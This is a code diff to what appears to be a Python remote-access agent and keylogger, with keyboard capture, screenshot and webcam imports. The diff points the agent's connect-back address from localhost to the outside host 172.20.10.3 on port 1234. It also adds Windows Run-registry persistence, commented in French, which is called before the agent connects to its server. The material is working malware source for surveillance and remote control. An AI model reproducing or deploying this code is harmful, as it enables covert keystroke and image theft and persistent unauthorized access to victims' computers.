@@ -1,3 +1,4 @@
+import os
 import socket
 import subprocess
 import threading
@@ -5,8 +6,10 @@ from pynput import keyboard
 import pyautogui
 import io
 import cv2
+import sys
+import winreg as reg
 
-ip_address = '127.0.0.1'
+ip_address = '172.20.10.3'
 port_number = 1234
 keylog_file = "keylog.txt"
 
@@ -72,10 +75,33 @@ def send_image_to_server(cs, image_bytes):
 
     cs.sendall(image_bytes)
 
+def add_persistence():
+    """
+    Ajoute une entrée au registre de Windows pour lancer automatiquement 'python agent.py' au démarrage.
+    """
+    try:
+        script_path = os.path.abspath(sys.argv[0])
+
+        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        reg_key = reg.HKEY_CURRENT_USER
+
+        with reg.ConnectRegistry(None, reg_key) as registry:
+            with reg.OpenKey(registry, key, 0, reg.KEY_SET_VALUE) as key:
+                app_name = "AgentPersistence"
+
+                command = f'python "{script_path}"'
+
+                reg.SetValueEx(key, app_name, 0, reg.REG_SZ, command)
+                print(f"Persistance ajoutée : {app_name} démarrera automatiquement au démarrage.")
+    except Exception as e:
+        print(f"Erreur lors de l'ajout de la persistance au registre : {e}")
+
 def connect_to_server():
     """
     Fonction pour établir une connexion avec le serveur et traiter les commandes reçues.
     """
+    add_persistence()
+
     cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cs.connect((ip_address, port_number))
 
